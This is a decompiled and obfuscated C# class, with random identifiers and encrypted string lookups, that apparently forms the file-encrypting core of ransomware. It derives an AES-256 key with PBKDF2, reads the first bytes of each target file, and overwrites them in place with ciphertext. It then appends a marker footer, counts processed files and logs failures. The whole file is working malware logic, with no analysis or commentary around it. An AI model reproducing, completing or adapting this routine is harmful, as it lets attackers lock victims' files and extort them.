using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace DFgOqDzZpZe;

public static class hLhUwUDAhWMjzuB
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] kRJzGPxkoWlQg(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = DqLVNmdkfpnNUMIc(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes DqLVNmdkfpnNUMIc(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] DfGjgEHjZJUE(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (thNrRmMEuvdxhHm.uEKpoPMiNFZ == getString_0(107396868))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (thNrRmMEuvdxhHm.MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(thNrRmMEuvdxhHm.knClGxGTQzcKgW, getString_0(107387357) + string_0 + getString_0(107400069) + ex.Message + getString_0(107395976));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool LDXgNdvfAheSqfs(string KyClZYkMZEgn, byte[] yTrxIKISCfGp, byte[] xPcAnAVJYVtBl = null)
	{
		try
		{
			byte[] array = null;
			if (thNrRmMEuvdxhHm.uEKpoPMiNFZ == getString_0(107396868))
			{
				array = (thNrRmMEuvdxhHm.dludHStvHyTu ? Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(thNrRmMEuvdxhHm.HRRvwQDpth) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400011)) + Convert.ToString(thNrRmMEuvdxhHm.vmbpzaFVaVU) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400011))) : Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(thNrRmMEuvdxhHm.HRRvwQDpth) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400052)) + Convert.ToString(thNrRmMEuvdxhHm.vmbpzaFVaVU) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400052))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(KyClZYkMZEgn, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(yTrxIKISCfGp, 0, yTrxIKISCfGp.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(KyClZYkMZEgn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!thNrRmMEuvdxhHm.dludHStvHyTu)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(xPcAnAVJYVtBl, 0, xPcAnAVJYVtBl.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (thNrRmMEuvdxhHm.dludHStvHyTu ? Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(thNrRmMEuvdxhHm.HRRvwQDpth) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400011)) + Convert.ToString(thNrRmMEuvdxhHm.vmbpzaFVaVU) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400011))) : Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(thNrRmMEuvdxhHm.HRRvwQDpth) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400052)) + Convert.ToString(thNrRmMEuvdxhHm.vmbpzaFVaVU) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400052))));
				FileStream fileStream2 = new FileStream(KyClZYkMZEgn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(yTrxIKISCfGp, 0, yTrxIKISCfGp.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(KyClZYkMZEgn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!thNrRmMEuvdxhHm.dludHStvHyTu)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(xPcAnAVJYVtBl, 0, xPcAnAVJYVtBl.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			thNrRmMEuvdxhHm.ZxYqzVUoLKX++;
		}
		catch (Exception ex)
		{
			if (thNrRmMEuvdxhHm.MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(thNrRmMEuvdxhHm.knClGxGTQzcKgW, getString_0(107387357) + KyClZYkMZEgn + getString_0(107400034) + ex.Message + getString_0(107395976));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (thNrRmMEuvdxhHm.dludHStvHyTu ? Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(thNrRmMEuvdxhHm.HRRvwQDpth) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400011)) + Convert.ToString(thNrRmMEuvdxhHm.vmbpzaFVaVU) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400011))) : Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(thNrRmMEuvdxhHm.HRRvwQDpth) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400052)) + Convert.ToString(thNrRmMEuvdxhHm.vmbpzaFVaVU) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400052))));
				FileStream fileStream4 = new FileStream(KyClZYkMZEgn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(yTrxIKISCfGp, 0, yTrxIKISCfGp.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(KyClZYkMZEgn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!thNrRmMEuvdxhHm.dludHStvHyTu)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(xPcAnAVJYVtBl, 0, xPcAnAVJYVtBl.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static hLhUwUDAhWMjzuB()
	{
		Strings.CreateGetStringDelegate(typeof(hLhUwUDAhWMjzuB));
	}
}
